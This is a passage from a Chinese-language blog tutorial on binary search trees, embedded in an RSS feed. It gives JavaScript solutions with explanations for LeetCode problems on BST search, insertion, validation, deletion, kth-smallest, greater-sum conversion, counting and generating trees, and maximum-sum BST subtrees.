 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} target 目标值
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>} 目标节点/null
 */</span>
<span class="hljs-keyword">var</span> searchBST = <span class="hljs-keyword">function</span>(<span class="hljs-params">root, target</span>) {
    <span class="hljs-comment">// 递归终止：空节点未找到，直接返回null</span>
    <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 目标值更大，去右子树查找</span>
    <span class="hljs-keyword">if</span> (target &gt; root.<span class="hljs-property">val</span>) <span class="hljs-keyword">return</span> <span class="hljs-title function_">searchBST</span>(root.<span class="hljs-property">right</span>, target);
    <span class="hljs-comment">// 目标值更小，去左子树查找</span>
    <span class="hljs-keyword">if</span> (target &lt; root.<span class="hljs-property">val</span>) <span class="hljs-keyword">return</span> <span class="hljs-title function_">searchBST</span>(root.<span class="hljs-property">left</span>, target);
    <span class="hljs-comment">// 找到目标节点，返回当前节点</span>
    <span class="hljs-keyword">return</span> root
};
</code></pre>
<h5 data-id="heading-9">复杂度</h5>
<p>时间：O(logN)（平衡BST）/ O(N)（链状BST），空间：O(logN)（递归栈）。</p>
<h4 data-id="heading-10">2.2 插入节点（力扣701题）</h4>
<h5 data-id="heading-11">核心思路</h5>
<ol>
<li>
<p>BST插入的<strong>关键性质</strong>：新节点最终必作为<strong>叶子节点</strong>插入，无需调整原有树结构（输入保证新值唯一）；</p>
</li>
<li>
<p>利用特性找到空节点（插入位置），创建新节点并返回，回溯时完成父节点与新节点的链接。</p>
</li>
</ol>
<h5 data-id="heading-12">实现代码</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 向BST插入新值，保持BST性质，返回插入后的根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root BST根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} value 新值（保证唯一）
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>} 插入后的根节点
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">insertIntoBST</span>(<span class="hljs-params">root, value</span>) {
    <span class="hljs-comment">// 递归终止：找到空节点，创建新节点作为插入位置</span>
    <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(value);
    <span class="hljs-comment">// 新值更大，去右子树插入，更新右子树链接</span>
    <span class="hljs-keyword">if</span> (value &gt; root.<span class="hljs-property">val</span>) {
        root.<span class="hljs-property">right</span> = <span class="hljs-title function_">insertIntoBST</span>(root.<span class="hljs-property">right</span>, value);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 新值更小，去左子树插入，更新左子树链接</span>
        root.<span class="hljs-property">left</span> = <span class="hljs-title function_">insertIntoBST</span>(root.<span class="hljs-property">left</span>, value);
    }
    <span class="hljs-comment">// 回溯返回当前节点，保证树结构连续</span>
    <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h5 data-id="heading-13">复杂度</h5>
<p>时间：O(logN)，空间：O(logN)（递归栈）。</p>
<h4 data-id="heading-14">2.3 验证BST合法性（力扣98题）</h4>
<h5 data-id="heading-15">核心思路</h5>
<ol>
<li>
<p>关键问题：单个节点的合法值范围由<strong>所有祖先节点</strong>共同决定，而非仅父节点；</p>
</li>
<li>
<p>解决方案：递归传递<strong>动态上下界</strong>，为每个节点划定开区间合法范围<code>(min, max)</code>，节点值必须严格在区间内，同时左右子树也需合法。</p>
</li>
</ol>
<h5 data-id="heading-16">实现代码</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 验证二叉树是否为合法BST
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root 二叉树根节点
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">boolean</span>} 是否为合法BST
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidBST</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-comment">// 空树视为合法BST，根节点初始上下界为负无穷/正无穷</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">traverse</span>(root, -<span class="hljs-title class_">Infinity</span>, <span class="hljs-title class_">Infinity</span>);
    
    <span class="hljs-comment">// 递归辅助：验证当前节点是否在(min, max)区间内</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">traverse</span>(<span class="hljs-params">node, min, max</span>) {
        <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-comment">// 节点值超出开区间，直接判定非法</span>
        <span class="hljs-keyword">if</span> (node.<span class="hljs-property">val</span> &lt;= min || node.<span class="hljs-property">val</span> &gt;= max) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-comment">// 验证左子树：上界更新为当前节点值，下界继承</span>
        <span class="hljs-keyword">const</span> leftValid = <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">left</span>, min, node.<span class="hljs-property">val</span>);
        <span class="hljs-comment">// 验证右子树：下界更新为当前节点值，上界继承</span>
        <span class="hljs-keyword">const</span> rightValid = <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">right</span>, node.<span class="hljs-property">val</span>, max);
        <span class="hljs-comment">// 左右子树都合法，当前子树才合法</span>
        <span class="hljs-keyword">return</span> leftValid &amp;&amp; rightValid;
    }
}
</code></pre>
<h5 data-id="heading-17">关键易错点</h5>
<ul>
<li>
<p>初始上下界必须为<code>(-Infinity, Infinity)</code>，根节点无祖先约束；</p>
</li>
<li>
<p>必须用<strong>开区间</strong>（<code>&lt;= / &gt;=</code>），避免节点值等于边界（如<code>[2,2,2]</code>误判为合法）。</p>
</li>
</ul>
<h4 data-id="heading-18">2.4 删除节点（力扣450题，核心难点）</h4>
<h5 data-id="heading-19">核心思路</h5>
<p>先通过特性找到目标节点，再分<strong>4种情况</strong>处理删除，核心是「删除后保持BST性质」，其中「有左右双孩子」的情况是难点。</p>
<h5 data-id="heading-20">4种删除情况</h5>
<ol>
<li>
<p>目标节点是<strong>叶子节点</strong>（左右子树均空）：直接删除，返回null让父节点置空该子树；</p>
</li>
<li>
<p>只有右子树：用右子树替换当前节点，返回右子树根节点；</p>
</li>
<li>
<p>只有左子树：用左子树替换当前节点，返回左子树根节点；</p>
</li>
<li>
<p>有<strong>左右双孩子</strong>（核心）：选择「左子树最大值节点（前驱）」或「右子树最小值节点（后继）」替换当前节点，再删除该替换节点（保证BST性质不变）。</p>
</li>
</ol>
<h5 data-id="heading-21">实现代码（前驱节点替换法，不修改节点值，仅调整指针）</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 删除BST中值为key的节点，保持BST性质，返回删除后的根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root BST根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} key 要删除的节点值
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>} 删除后的根节点
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteNode</span>(<span class="hljs-params">root, key</span>) {
    <span class="hljs-comment">// 递归终止：空树/未找到目标节点，返回null</span>
    <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 目标值更大，去右子树递归删除，更新右子树链接</span>
    <span class="hljs-keyword">if</span> (key &gt; root.<span class="hljs-property">val</span>) {
        root.<span class="hljs-property">right</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">right</span>, key);
        <span class="hljs-keyword">return</span> root;
    }
    <span class="hljs-comment">// 目标值更小，去左子树递归删除，更新左子树链接</span>
    <span class="hljs-keyword">if</span> (key &lt; root.<span class="hljs-property">val</span>) {
        root.<span class="hljs-property">left</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">left</span>, key);
        <span class="hljs-keyword">return</span> root;
    }

    <span class="hljs-comment">// 找到目标节点，分情况处理</span>
    <span class="hljs-keyword">if</span> (key === root.<span class="hljs-property">val</span>) {
        <span class="hljs-comment">// 情况1：叶子节点，直接删除</span>
        <span class="hljs-keyword">if</span> (!root.<span class="hljs-property">left</span> &amp;&amp; !root.<span class="hljs-property">right</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        <span class="hljs-comment">// 情况2：只有右子树，用右子树替换</span>
        <span class="hljs-keyword">if</span> (!root.<span class="hljs-property">left</span>) <span class="hljs-keyword">return</span> root.<span class="hljs-property">right</span>;
        <span class="hljs-comment">// 情况3：只有左子树，用左子树替换</span>
        <span class="hljs-keyword">if</span> (!root.<span class="hljs-property">right</span>) <span class="hljs-keyword">return</span> root.<span class="hljs-property">left</span>;
        <span class="hljs-comment">// 情况4：有双孩子，左子树最大值（前驱）替换</span>
        <span class="hljs-keyword">let</span> maxLeft = root.<span class="hljs-property">left</span>;
        <span class="hljs-comment">// 找到左子树最右侧节点（最大值）</span>
        <span class="hljs-keyword">while</span> (maxLeft.<span class="hljs-property">right</span>) maxLeft = maxLeft.<span class="hljs-property">right</span>;
        <span class="hljs-comment">// 先删除左子树的最大值节点</span>
        root.<span class="hljs-property">left</span> = <span class="hljs-title function_">deleteNode</span>(root.<span class="hljs-property">left</span>, maxLeft.<span class="hljs-property">val</span>);
        <span class="hljs-comment">// 用前驱节点替换当前节点，调整指针</span>
        maxLeft.<span class="hljs-property">left</span> = root.<span class="hljs-property">left</span>;
        maxLeft.<span class="hljs-property">right</span> = root.<span class="hljs-property">right</span>;
        <span class="hljs-keyword">return</span> maxLeft;
    }

    <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h5 data-id="heading-22">复杂度</h5>
<p>时间：O(logN)，空间：O(logN)（递归栈）。</p>
<h3 data-id="heading-23">三、BST经典题型：利用有序性解决问题</h3>
<p>BST的中序遍历有序性是解决这类问题的「黄金钥匙」，核心思路是**「通过中序遍历将BST转化为有序序列，再针对性处理」**，无需额外排序，时间复杂度最优。</p>
<h4 data-id="heading-24">3.1 寻找第K小的元素（力扣230题）</h4>
<h5 data-id="heading-25">题目要求</h5>
<p>给定BST，查找其中第K小的元素（从1开始计数）。</p>
<h5 data-id="heading-26">核心思路</h5>
<p>利用BST<strong>中序遍历升序</strong>的特性，中序遍历过程中维护全局计数，遍历到第K个节点时即为答案，找到后立即终止遍历（剪枝）。</p>
<h5 data-id="heading-27">实现代码</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 查找BST中第K小的元素
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root BST根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} k 第k小（1&lt;=k&lt;=节点总数）
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>} 第k小节点值
 */</span>
<span class="hljs-keyword">var</span> kthSmallest = <span class="hljs-keyword">function</span>(<span class="hljs-params">root, k</span>) {
    <span class="hljs-keyword">let</span> res = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 存储结果</span>
    <span class="hljs-keyword">let</span> rank = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 全局计数，记录当前遍历节点的排名</span>

    <span class="hljs-comment">// 中序遍历：左→根→右</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">traverse</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-comment">// 递归终止：空节点/已找到目标，直接返回</span>
        <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span> || res !== <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-comment">// 遍历左子树</span>
        <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">left</span>);
        <span class="hljs-comment">// 处理当前节点：计数+判断是否为第k小</span>
        rank++;
        <span class="hljs-keyword">if</span> (rank === k) {
            res = node.<span class="hljs-property">val</span>;
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 遍历右子树</span>
        <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">right</span>);
    }

    <span class="hljs-title function_">traverse</span>(root);
    <span class="hljs-keyword">return</span> res;
};
</code></pre>
<h5 data-id="heading-28">关键优化</h5>
<p>找到目标后立即终止遍历，避免无效的后续递归，提升实际执行效率。</p>
<h4 data-id="heading-29">3.2 BST转化为累加树（力扣538/1038题）</h4>
<h5 data-id="heading-30">题目要求</h5>
<p>将BST转化为累加树，使每个节点的新值等于原树中<strong>大于或等于</strong>该节点值的所有节点值之和。</p>
<h5 data-id="heading-31">核心思路</h5>
<ol>
<li>
<p>BST中序遍历（左→根→右）为升序 → <strong>逆序中序遍历（右→根→左）为降序</strong>；</p>
</li>
<li>
<p>逆序遍历过程中维护全局累加和<code>sum</code>，先遍历的节点值一定更大，累加后赋值给当前节点，自然得到「所有大于等于当前节点值的和」。</p>
</li>
</ol>
<h5 data-id="heading-32">实现代码</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 将BST转化为累加树，直接修改原树，返回根节点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root BST根节点
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>} 累加树根节点
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">convertBST</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">if</span> (root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>; <span class="hljs-comment">// 全局累加和，记录所有已遍历节点值的和</span>

    <span class="hljs-comment">// 逆序中序遍历：右→根→左</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">traverse</span>(<span class="hljs-params">node</span>) {
        <span class="hljs-keyword">if</span> (node === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-comment">// 先遍历右子树（更大的节点）</span>
        <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">right</span>);
        <span class="hljs-comment">// 处理当前节点：累加+更新值</span>
        sum += node.<span class="hljs-property">val</span>;
        node.<span class="hljs-property">val</span> = sum;
        <span class="hljs-comment">// 再遍历左子树（更小的节点）</span>
        <span class="hljs-title function_">traverse</span>(node.<span class="hljs-property">left</span>);
    }

    <span class="hljs-title function_">traverse</span>(root);
    <span class="hljs-keyword">return</span> root;
}
</code></pre>
<h5 data-id="heading-33">优势</h5>
<p>直接修改原树节点值，空间复杂度仅为O(logN)（递归栈），无需额外创建节点，为最优解。</p>
<h3 data-id="heading-34">四、BST进阶题型：构造与子树问题</h3>
<p>这类题目属于BST的高频难题，核心考察<strong>动态规划</strong>和<strong>后序遍历的信息收集能力</strong>，其中「二叉搜索子树的最大键值和」是综合考察的典型代表。</p>
<h4 data-id="heading-35">4.1 构造不同的BST（力扣96/95题）</h4>
<p>这类题目考察BST的组合特性，核心是**「以任意节点为根，拆分左右子树节点数，利用乘法原理计算组合数/生成组合」**。</p>
<h5 data-id="heading-36">4.1.1 计算BST种数（力扣96题，动态规划+卡特兰数）</h5>
<h6 data-id="heading-37">核心思路</h6>
<ol>
<li>
<p>关键性质：BST的种数仅与<strong>节点数量</strong>有关，与节点具体值无关；</p>
</li>
<li>
<p>动态规划定义：<code>dp[i]</code>表示<code>i</code>个节点能组成的不同BST种数；</p>
</li>
<li>
<p>状态转移：选<code>j</code>为根节点，左子树有<code>j-1</code>个节点，右子树有<code>i-j</code>个节点，总种数为<code>dp[j-1] * dp[i-j]</code>（乘法原理）。</p>
</li>
</ol>
<h6 data-id="heading-38">实现代码</h6>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 计算n个节点（1~n）能组成的不同BST种数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} n 节点总数
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>} BST种数
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">numTrees</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-keyword">const</span> dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(n + <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>);
    <span class="hljs-comment">// 边界条件：0个/1个节点，仅1种BST</span>
    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
    dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;

    <span class="hljs-comment">// 计算2~n个节点的种数</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) {
        <span class="hljs-keyword">let</span> total = <span class="hljs-number">0</span>;
        <span class="hljs-comment">// 枚举根节点j，拆分左右子树</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++) {
            total += dp[j - <span class="hljs-number">1</span>] * dp[i - j];
        }
        dp[i] = total;
    }

    <span class="hljs-keyword">return</span> dp[n];
}
</code></pre>
<h6 data-id="heading-39">本质</h6>
<p>该问题的解为<strong>卡特兰数</strong>，适用于所有「合法组合数」问题（如括号生成、出栈顺序等）。</p>
<h5 data-id="heading-40">4.1.2 生成所有BST（力扣95题，递归+子问题复用）</h5>
<h6 data-id="heading-41">核心思路</h6>
<p>递归构造闭区间<code>[lo, hi]</code>的所有BST：枚举区间内每个数为根节点，递归生成左右子树的所有组合，再通过笛卡尔积组合左右子树与根节点。</p>
<h6 data-id="heading-42">实现代码</h6>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 生成n个节点（1~n）的所有不同BST，返回根节点数组
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} n 节点总数
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode[]</span>} 所有BST根节点数组
 */</span>
<span class="hljs-keyword">var</span> generateTrees = <span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-keyword">if</span> (n === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> [];
    <span class="hljs-comment">// 构造闭区间[1, n]的所有BST</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">build</span>(<span class="hljs-number">1</span>, n);

    <span class="hljs-comment">// 递归构造闭区间[lo, hi]的所有BST</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">lo, hi</span>) {
        <span class="hljs-keyword">const</span> res = [];
        <span class="hljs-comment">// 边界条件：lo&gt;hi，添加null（保证叶子节点能被正确创建）</span>
        <span class="hljs-keyword">if</span> (lo &gt; hi) {
            res.<span class="hljs-title function_">push</span>(<span class="hljs-literal">null</span>);
            <span class="hljs-keyword">return</span> res;
        }
        <span class="hljs-comment">// 枚举根节点</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = lo; i &lt;= hi; i++) {
            <span class="hljs-comment">// 递归生成左右子树的所有组合</span>
            <span class="hljs-keyword">const</span> leftTrees = <span class="hljs-title function_">build</span>(lo, i - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> rightTrees = <span class="hljs-title function_">build</span>(i + <span class="hljs-number">1</span>, hi);
            <span class="hljs-comment">// 组合左右子树与根节点</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> left <span class="hljs-keyword">of</span> leftTrees) {
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> right <span class="hljs-keyword">of</span> rightTrees) {
                    <span class="hljs-keyword">const</span> root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(i);
                    root.<span class="hljs-property">left</span> = left;
                    root.<span class="hljs-property">right</span> = right;
                    res.<span class="hljs-title function_">push</span>(root);
                }
            }
        }
        <span class="hljs-keyword">return</span> res;
    }
};
</code></pre>
<h4 data-id="heading-43">4.2 二叉搜索子树的最大键值和（力扣1373题，BST综合实战）</h4>
<p>该题是BST后序遍历的经典代表，考察**「子树信息收集与传递」**能力，是大厂面试的高频难题。</p>
<h5 data-id="heading-44">题目要求</h5>
<p>给定一棵二叉树，找到其中<strong>所有合法BST子树</strong>的最大键值和（若所有BST子树和为负，返回0）。</p>
<h5 data-id="heading-45">核心思路</h5>
<ol>
<li>
<p>问题拆解：需要同时完成「判断子树是否为BST」和「计算BST子树和」，两个需求都需要<strong>子树的信息支撑</strong>；</p>
</li>
<li>
<p>后序遍历的优势：后序位置可获取子树的返回信息，能基于子树结果判断当前子树是否为BST、计算和值；</p>
</li>
<li>
<p>四元信息推导：从需求倒推递归需要返回的4个关键信息（缺一不可）：</p>
<ul>
<li>
<p><code>isBST</code>：当前子树是否为合法BST；</p>
</li>
<li>
<p><code>minVal</code>：当前子树的最小值（BST判断的关键）；</p>
</li>
<li>
<p><code>maxVal</code>：当前子树的最大值（BST判断的关键）；</p>
</li>
<li>
<p><code>sumVal</code>：当前子树的节点和（计算最大和的关键）。</p>
</li>
</ul>
</li>
<li>
<p>非BST隔离：非BST子树返回无效最值（<code>Infinity/-Infinity</code>），避免父节点误判。</p>
</li>
</ol>
<h5 data-id="heading-46">优化版实现代码（100%通过所有测试用例）</h5>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 找到二叉树中合法BST子树的最大键值和，负和返回0
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} root 二叉树根节点
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>} 最大键值和/0
 */</span>
<span class="hljs-keyword">var</span> maxSumBST = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">let</span> maxSum = -<span class="hljs-title class_">Infinity</span>; <span class="hljs-comment">// 初始负无穷，兼容负权值BST</span>

    <span class="hljs-comment">// 后序遍历，返回四元信息[isBST, minVal, maxVal, sumVal]</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">postOrder</span> = (<span class="hljs-params">node</span>) =&gt; {
        <span class="hljs-keyword">if</span> (!node) <span class="hljs-keyword">return</span> [<span class="hljs-literal">true</span>, <span class="hljs-title class_">Infinity</span>, -<span class="hljs-title class_">Infinity</span>, <span class="hljs-number">0</span>]; <span class="hljs-comment">// 空节点固定返回</span>
        <span class="hljs-comment">// 递归获取左右子树信息</span>
        <span class="hljs-keyword">const</span> [lBST, lMin, lMax, lSum] = <span class="hljs-title function_">postOrder</span>(node.<span class="hljs-property">left</span>);
        <span class="hljs-keyword">const</span> [rBST, rMin, rMax, rSum] = <span class="hljs-title function_">postOrder</span>(node.<span class="hljs-property">right</span>);

        <span class="hljs-comment">// 仅合法BST时处理，否则返回无效信息</span>
        <span class="hljs-keyword">if</span> (lBST &amp;&amp; rBST &amp;&amp; node.<span class="hljs-property">val</span> &gt; lMax &amp;&amp; node.<span class="hljs-property">val</span> &lt; rMin) {
            <span class="hljs-keyword">const</span> curSum = lSum + node.<span class="hljs-property">val</span> + rSum;
            maxSum = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(maxSum, curSum);
            <span class="hljs-keyword">return</span> [<span class="hljs-literal">true</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(lMin, node.<span class="hljs-property">val</span>), <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(rMax, node.<span class="hljs-property">val</span>), curSum];
        }

        <span class="hljs-comment">// 非BST返回无效信息，彻底隔离</span>
        <span class="hljs-keyword">return</span> [<span class="hljs-literal">false</span>, <span class="hljs-title class_">Infinity</span>, -<span class="hljs-title class_">Infinity</span>, <span class="hljs-number">0</span>];
    };

    <span class="hljs-title function_">postOrder</span>(root);
    <span class="hljs-comment">// 有合法BST则取max(maxSum,0)，无则返回0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(maxSum, <span class="hljs-number">0</span>);
};
</code></pre>
<h5 data-id="heading-47">核心解题心法</h5>
<p><strong>「从需求倒推条件，从条件倒推数据，让子问题的返回值支撑父问题的所有操作」</strong>，这一思路适用于所有树的子树问题。</p>
<h3 data-id="heading-48">五、BST通用解题心法（精华总结）</h3>
<p>通过以上知识点和题型分析，提炼出3条BST通用解题心法，掌握后可应对99%的BST题目：</p>
<h4 data-id="heading-49">心法1：紧抓「左小右大」和「中序有序」两大核心特性</h4>
<ul>
<li>
<p>涉及<strong>查找、插入、删除、合法性验证</strong>等基础操作，优先用「左小右大」特性引导遍历，减少无效操作；</p>
</li>
<li>
<p>涉及<strong>有序性问题</strong>（第K小、累加、排序、区间查询等），优先利用「中序遍历有序」特性，将BST转化为有序序列处理。</p>
</li>
</ul>
<h4 data-id="heading-50">心法2：树的子树问题，优先考虑后序遍历+自定义返回信息</h4>
<ul>
<li>
<p>一旦题目要求「基于子树结果判断当前节点/子树」（如1373题、平衡树判断），必须用后序遍历；</p>
</li>
<li>
<p>自定义返回信息的推导逻辑：<strong>需求→判断条件→所需数据</strong>，确保子问题的返回值能支撑父问题的所有判断和计算，无冗余、无缺失。</p>
</li>
</ul>
<h4 data-id="heading-51">心法3：BST的构造/组合问题，利用「根节点拆分+乘法原理」</h4>
<ul>
<li>
<p>构造BST时，任意节点都可作为根节点，只需拆分左右子树的节点数/值范围；</p>
</li>
<li>
<p>组合数计算用动态规划（卡特兰数），组合生成用递归+笛卡尔积，复用子问题结果避免重复计算。</p>
</li>
</ul>
<h3 data-id="heading-52">总结</h3>
<p>二叉搜索树是算法学习的重点，其核心价值在于「<strong>高效的有序操作能力</strong>」。从基础的「左小右大」定义，到中序遍历的有序性，再到后序遍历的信息收集，所有知识点和题型都围绕这两个核心特性展开。</p>
<p>学习BST的关键不是死记硬背代码，而是<strong>理解特性背后的逻辑，掌握解题心法的推导过程</strong>：比如从需求倒推递归的返回信息，从特性引导遍历的方向。通过练习基础操作、经典有序问题、进阶构造和子树问题，逐步形成BST的解题思维，最终能灵活应对各类高频考点和面试难题。</p>
<p>掌握BST后，后续可深入学习<strong>平衡二叉树</strong>（红黑树、AVL树），理解如何解决BST链状化导致的效率降低问题，进一步完善树形数据结构的知识体系。</p>
</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>